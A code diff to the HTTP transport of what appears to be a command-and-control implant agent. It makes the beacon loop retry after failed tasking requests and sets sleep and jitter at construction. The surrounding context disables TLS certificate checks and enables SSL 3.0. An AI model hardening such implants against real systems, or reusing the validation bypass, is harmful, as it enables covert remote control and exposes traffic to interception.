@@ -134,7 +134,9 @@ namespace HttpxTransport
             ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
             // Enable TLS protocols: TLS 1.2, TLS 1.1, TLS 1.0, and SSL 3.0
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls | SecurityProtocolType.Ssl3;
-            
+
+            Agent.SetSleep(CallbackInterval, CallbackJitter);
+
 #if DEBUG
             DebugWriteLine("[HttpxProfile] Constructor complete");
 #endif
@@ -990,10 +992,7 @@ namespace HttpxTransport
 #if DEBUG
             DebugWriteLine("[Start] HttpxProfile.Start() called - beginning main loop");
 #endif
-            
-            // Set the agent's sleep interval and jitter from profile settings
-            Agent.SetSleep(CallbackInterval, CallbackJitter);
-            
+
             bool first = true;
             while(Agent.IsAlive())
             {
@@ -1005,7 +1004,7 @@ namespace HttpxTransport
                 }
                 DebugWriteLine("[Start] Beginning GetTasking call");
 #endif
-                
+
                 bool bRet = GetTasking(resp =>
                 {
 #if DEBUG
@@ -1022,9 +1021,10 @@ namespace HttpxTransport
                 if (!bRet)
                 {
 #if DEBUG
-                    DebugWriteLine("[Start] GetTasking returned false, breaking loop");
+                    DebugWriteLine("[Start] GetTasking returned false, retrying after sleep");
 #endif
-                    break;
+                    Agent.Sleep();
+                    continue;
                 }
 
 #if DEBUG
@@ -1032,7 +1032,7 @@ namespace HttpxTransport
 #endif
                 Agent.Sleep();
             }
-            
+
 #if DEBUG
             DebugWriteLine("[Start] Main loop ended");
 #endif
